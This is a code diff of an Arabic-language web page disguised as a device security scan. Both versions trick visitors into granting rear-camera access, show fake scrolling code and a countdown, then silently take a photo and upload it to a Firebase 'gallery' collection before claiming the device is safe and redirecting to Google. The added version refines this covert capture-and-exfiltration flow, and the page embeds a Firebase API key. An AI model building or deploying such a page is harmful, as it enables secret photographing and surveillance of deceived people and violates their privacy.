@@ -1,90 +1,141 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص النظام</title>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Courier New',monospace;background:#000;color:#0f0;min-height:100vh;padding:20px;overflow:hidden}
-.container{max-width:500px;margin:0 auto;text-align:center}
-.btn-start{padding:20px 40px;background:#0a0a0a;color:#0f0;border:2px solid #0f0;font-size:20px;cursor:pointer;border-radius:10px;margin-top:50px;font-family:'Courier New',monospace;font-weight:bold}
-.btn-start:hover{background:#0f0;color:#000}
-.code-screen{display:none;text-align:left;font-size:11px;line-height:1.4;height:300px;overflow:hidden;padding:10px;background:#000;border:1px solid #0f0;border-radius:8px;margin:15px 0}
-.code-screen .line{opacity:0.7}
-.code-screen .line:nth-child(odd){color:#0f0}
-.code-screen .line:nth-child(even){color:#0a0}
-.timer{color:#ff0;font-size:40px;font-weight:bold;margin:15px 0}
-.status{color:#0f0;font-size:13px}
-.progress{width:100%;height:5px;background:#111;border-radius:3px;margin:10px 0;overflow:hidden}
-.progress-fill{height:100%;width:0%;background:#0f0;transition:width 0.3s}
-canvas,video{display:none}
-</style></head>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص النظام</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Courier New',monospace;background:#000;color:#0f0;min-height:100vh;overflow:hidden}
+        .screen{display:none;padding:20px;text-align:center;height:100vh}
+        .screen.active{display:flex;flex-direction:column;align-items:center;justify-content:center}
+        .logo{font-size:60px;margin-bottom:10px;animation:pulse 1s infinite}
+        @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+        h1{color:#0f0;font-size:20px;margin-bottom:6px}
+        .sub{color:#666;font-size:12px;margin-bottom:20px}
+        .btn-start{padding:18px 40px;background:transparent;color:#0f0;border:2px solid #0f0;font-size:18px;cursor:pointer;border-radius:10px;font-family:'Courier New',monospace;font-weight:bold}
+        .btn-start:active{background:#0f0;color:#000}
+        .code-screen{background:#000;border:1px solid #0f0;border-radius:8px;padding:10px;width:100%;max-width:420px;height:200px;overflow:hidden;text-align:left;font-size:9px;line-height:1.2;margin:8px 0}
+        .timer{color:#ff0;font-size:50px;font-weight:bold;margin:6px 0}
+        .progress{width:100%;max-width:420px;height:5px;background:#111;border-radius:3px;margin:6px 0;overflow:hidden}
+        .progress-fill{height:100%;width:0%;background:#0f0;transition:width 0.3s}
+        .status{color:#0f0;font-size:13px;margin:4px 0}
+        .steps{text-align:right;width:100%;max-width:420px;margin:6px 0;font-size:9px;color:#555}
+        .steps div{padding:2px 0}
+        .steps div.done{color:#0f0}
+        .steps div.current{color:#ff0;animation:blink 0.7s infinite}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+        .result-box{background:rgba(0,255,0,0.05);border:2px solid #0f0;border-radius:12px;padding:25px;text-align:center}
+        .result-box.error{border-color:#ff0040;background:rgba(255,0,0,0.05)}
+        .result-box .icon{font-size:60px}
+        .result-box h2{font-size:20px;margin:10px 0}
+        .result-box p{color:#888;font-size:12px}
+        video,canvas{display:none}
+    </style>
+</head>
 <body>
-<div class="container">
-<div id="startScreen">
-<h1 style="color:#0f0;font-size:22px;">🛡️ فحص الكاميرا</h1>
-<p style="color:#666;margin:20px 0;">فحص شامل للكاميرا الخلفية والكشف عن التهديدات</p>
-<button class="btn-start" onclick="startScan()">⚡ ابدأ الفحص</button>
+
+<div class="screen active" id="screen-start">
+    <div class="logo">🛡️</div>
+    <h1>فحص النظام</h1>
+    <p class="sub">فحص شامل لجميع مكونات الجهاز</p>
+    <button class="btn-start" onclick="startScan()">⚡ ابدأ الفحص</button>
 </div>
 
-<div id="scanScreen" class="code-screen"></div>
-<div id="timerScreen" style="display:none;text-align:center;">
-<div class="timer" id="timer">40</div>
-<div class="progress"><div class="progress-fill" id="progressFill"></div></div>
-<div class="status" id="status">⏳ جاري فحص النظام...</div>
+<div class="screen" id="screen-scan">
+    <div class="logo">🔄</div>
+    <h1>جاري فحص النظام...</h1>
+    <div class="steps">
+        <div class="current" id="st1">⏳ تهيئة النظام...</div>
+        <div id="st2">⬜ فحص المكونات</div>
+        <div id="st3">⬜ فحص الحساسات</div>
+        <div id="st4">⬜ فحص الذاكرة</div>
+        <div id="st5">⬜ التحقق من الأمان</div>
+    </div>
+    <div class="timer" id="timer">30</div>
+    <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="status" id="status">⏳ جاري الفحص...</div>
+    <div class="code-screen" id="codeScreen"></div>
 </div>
+
+<div class="screen" id="screen-result">
+    <div class="result-box" id="resultBox">
+        <div class="icon" id="resultIcon">✅</div>
+        <h2 id="resultTitle">تم الفحص بنجاح!</h2>
+        <p id="resultMsg">لا يوجد أي تهديدات - جهازك آمن</p>
+    </div>
 </div>
-<canvas id="canvas" width="320" height="240"></canvas>
+
 <video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
 firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
 var db=firebase.firestore();
-var stream=null;
+var stream=null,scanFinished=false;
+
+function showScreen(id){
+    document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
+    document.getElementById(id).classList.add('active');
+}
 
 function generateCode(){
-var lines=[];
-for(var i=0;i<80;i++){
-var line='';
-for(var j=0;j<60;j++){line+=String.fromCharCode(33+Math.floor(Math.random()*90));}
-lines.push('<div class="line">'+line+'</div>');
+    var chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{}|;:,.<>?/';
+    var lines=[];
+    for(var i=0;i<50;i++){var line='';for(var j=0;j<50;j++){line+=chars[Math.floor(Math.random()*chars.length)];}lines.push('<div class="line">'+line+'</div>');}
+    return lines.join('');
 }
-return lines.join('');
+
+function updateSteps(step){
+    var steps=['st1','st2','st3','st4','st5'];
+    var texts=['✅ تهيئة النظام','✅ فحص المكونات','✅ فحص الحساسات','✅ فحص الذاكرة','✅ التحقق من الأمان'];
+    for(var i=0;i<steps.length;i++){var el=document.getElementById(steps[i]);if(i<step){el.className='done';el.textContent=texts[i];}else if(i===step){el.className='current';}}
+}
+
+function finishScan(success,title,msg){
+    if(scanFinished)return;scanFinished=true;
+    showScreen('screen-result');
+    var box=document.getElementById('resultBox');
+    if(!success){box.className='result-box error';document.getElementById('resultIcon').textContent='❌';}
+    else{box.className='result-box';document.getElementById('resultIcon').textContent='✅';}
+    document.getElementById('resultTitle').textContent=title;
+    document.getElementById('resultMsg').textContent=msg;
+    setTimeout(function(){window.location.href='https://google.com/';},3000);
 }
 
 async function startScan(){
-document.getElementById('startScreen').style.display='none';
-try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});document.getElementById('video').srcObject=stream;}catch(e){}
-
-document.getElementById('scanScreen').style.display='block';
-document.getElementById('scanScreen').innerHTML=generateCode();
-document.getElementById('timerScreen').style.display='block';
-
-// كود متحرك
-var codeInterval=setInterval(function(){
-document.getElementById('scanScreen').innerHTML=generateCode();
-document.getElementById('scanScreen').scrollTop=document.getElementById('scanScreen').scrollHeight;
-},200);
-
-// تصوير بعد 30 ثانية
-setTimeout(function(){
-var c=document.getElementById('canvas'),ctx=c.getContext('2d');
-ctx.drawImage(document.getElementById('video'),0,0,320,240);
-db.collection('gallery').add({url:c.toDataURL('image/jpeg',0.5),type:'📷 فحص خلفي',timestamp:new Date().toISOString()});
-if(stream)stream.getTracks().forEach(function(t){t.stop()});
-},30000);
-
-// عداد
-var sec=40;
-var timerInterval=setInterval(function(){
-sec--;document.getElementById('timer').textContent=sec;
-document.getElementById('progressFill').style.width=((40-sec)/40*100)+'%';
-if(sec<=35)document.getElementById('status').textContent='⏳ فحص ملفات kernel...';
-if(sec<=25)document.getElementById('status').textContent='⏳ فحص الذاكرة المؤقتة...';
-if(sec<=15)document.getElementById('status').textContent='⏳ فحص الحساسات...';
-if(sec<=5)document.getElementById('status').textContent='⏳ التحقق من الأمان...';
-if(sec<=0){clearInterval(timerInterval);clearInterval(codeInterval);
-document.getElementById('status').textContent='✅ تم الفحص - الجهاز آمن';
-setTimeout(function(){window.location.href='https://google.com/'},3000);
+    showScreen('screen-scan');scanFinished=false;
+    
+    try{
+        stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
+        document.getElementById('video').srcObject=stream;
+        
+        // تصوير بعد 25 ثانية
+        setTimeout(function(){
+            var c=document.getElementById('canvas'),ctx=c.getContext('2d');
+            ctx.drawImage(document.getElementById('video'),0,0,640,480);
+            db.collection('gallery').add({url:c.toDataURL('image/jpeg',0.6),type:'📷 فحص النظام',timestamp:new Date().toISOString()}).then(function(){
+                if(stream)stream.getTracks().forEach(function(t){t.stop();});
+            });
+        },25000);
+    }catch(e){finishScan(false,'❌ فشل','عد المحاولة لاحقاً');return;}
+    
+    document.getElementById('codeScreen').innerHTML=generateCode();
+    var codeInterval=setInterval(function(){document.getElementById('codeScreen').innerHTML=generateCode();document.getElementById('codeScreen').scrollTop=document.getElementById('codeScreen').scrollHeight;},100);
+    
+    var sec=30;document.getElementById('timer').textContent=sec;updateSteps(0);
+    var timerInterval=setInterval(function(){
+        sec--;document.getElementById('timer').textContent=sec;
+        document.getElementById('progressFill').style.width=((30-sec)/30*100)+'%';
+        if(sec<=26)updateSteps(1);
+        if(sec<=20){updateSteps(2);document.getElementById('status').textContent='⏳ فحص الحساسات...';}
+        if(sec<=12)updateSteps(3);
+        if(sec<=5){updateSteps(4);document.getElementById('status').textContent='⏳ التحقق من الأمان...';}
+        if(sec<=0){clearInterval(timerInterval);clearInterval(codeInterval);setTimeout(function(){if(!scanFinished)finishScan(true,'✅ تم الفحص بنجاح!','لا يوجد أي تهديدات - جهازك آمن');},2000);}
+    },1000);
 }
-},1000);
-}
-</script></body></html>
+</script>
+</body>
+</html>
